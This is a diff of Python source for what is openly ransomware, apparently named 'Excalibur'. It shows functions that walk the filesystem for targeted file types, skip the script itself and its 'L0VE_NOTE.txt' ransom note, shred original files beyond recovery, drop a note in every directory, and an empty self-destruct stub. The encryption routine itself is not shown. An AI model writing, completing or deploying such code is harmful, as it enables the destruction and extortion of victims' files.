@@ -26,15 +26,40 @@ def recursive_walk(paths, target_extensions, mode):
                         if ext in target_extensions:
                             file_list.append(os.path.join(root, file))
                     elif mode == 2:
-                        if "AeS" in ext:  # Updated from file to ext, updated from .AeS to AeS
+                        if "AeS" in ext:
                             file_list.append(os.path.join(root, file))
     return file_list
+
+# def recursive_walk(paths, target_extensions, mode):
+#     """
+#     Walk through each path in the filesystem, return a list of valid files to infect
+#     or files to decrypt depending on mode param
+#
+#     :param paths:             Array of paths to walk recursively
+#     :param target_extensions: Array of targeted extensions
+#     :param mode:              Encryption mode (encrypt or decrypt)
+#     :return file_list:        Array of valid files to encrypt or decrypt
+#     """
+#
+#     for path in tqdm(paths, leave=True, smoothing=0.5, desc="Gathering files...."):
+#         for root, _, files in os.walk(path):  # root=path, _=subdirectories, files=files of any type
+#             for file in files:
+#                 if file not in [sys.argv[0], "L0VE_NOTE.txt"]:  # Don't encrypt self or ransom note
+#                     abs_path = os.path.join(root, file)  # Get the files absolute path
+#                     ext = abs_path.split(".")[-1]  # Set ext to the file's extension
+#                     if mode == 1:
+#                         if ext in target_extensions:
+#                             yield os.path.join(root, file)
+#                     elif mode == 2:
+#                         if "AeS" in ext:
+#                             yield os.path.join(root, file)
 
 
 def secure_delete(filename):
     """
     Securely delete file. Try running shred in a subprocess, if it doesnt exist
     perform a manual 3 pass overwrite using os
+    This is currently the bottleneck of this project, need to daemonize it in a thread
 
     :param filename:  absolute path of file to delete
     """
@@ -46,12 +71,12 @@ def secure_delete(filename):
         # -u deletes file after complete, -z zeroes the file at the end, hiding that it was shredded
         os.system("shred -uz {} >/dev/null 2>&1".format(filename))
     except (FileNotFoundError, OSError, BlockingIOError, Exception):
-            with open(filename, "ab") as f:
-                length = f.tell()      # Read each line of the file until the end
-                for _ in range(0, 3):  # _ in python is short for a variable that isn't used
-                    f.seek(0)          # Move back to the start of the file
-                    f.write(os.urandom(length))  # Write garbage to file
-            os.remove(filename)
+        with open(filename, "ab") as f:
+            length = f.tell()  # Read each line of the file until the end
+            for _ in range(0, 3):  # _ in python is short for a variable that isn't used
+                f.seek(0)  # Move back to the start of the file
+                f.write(os.urandom(length))  # Write garbage to file
+        os.remove(filename)
 
 
 def parse_array(array):
@@ -88,6 +113,11 @@ def create_chunks(array, n):
         exit("Not enough files to split. Encryption process has been complete")
 
 
+def self_destruct():
+    """Function to encrypt everything Excalibur related"""
+    pass
+
+
 def leave_notes(note, paths):
     """
     Drop a note in each path
@@ -102,5 +132,3 @@ def leave_notes(note, paths):
                 f.write(note)
     except (IOError, FileExistsError):
         pass
-
-
